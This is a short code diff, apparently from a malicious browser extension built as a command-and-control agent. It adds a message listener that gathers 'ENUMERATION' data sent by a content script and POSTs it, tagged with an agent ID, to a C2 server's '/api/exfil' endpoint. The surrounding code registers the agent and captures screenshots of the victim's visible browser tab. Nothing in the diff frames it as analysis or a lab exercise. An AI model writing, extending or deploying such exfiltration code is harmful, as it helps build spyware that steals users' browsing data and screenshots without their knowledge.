@@ -328,6 +328,31 @@ async function registerAgent() {
   }
 }
 
+// Listen for exfil messages and other commands from content script
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+  if (message.type === 'exfil' && message.action === 'ENUMERATION') {
+    const payload = {
+      agent_id: agent_id,
+      action: message.action,
+      payload: message.data
+    };
+
+    fetch(`${C2_SERVER}/api/exfil`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log('Enumeration data sent successfully:', data);
+    })
+    .catch(error => {
+      console.error('Error sending enumeration data:', error);
+    });
+  }
+
   // Handle our custom screenshot capture request
   if (message.type === 'capture_screenshot') {
     chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: 'png' }, function(dataUrl) {
@@ -357,7 +382,6 @@ async function registerAgent() {
     });
     sendResponse({ status: 'ok' });
   }
-
   return true;
 });
 
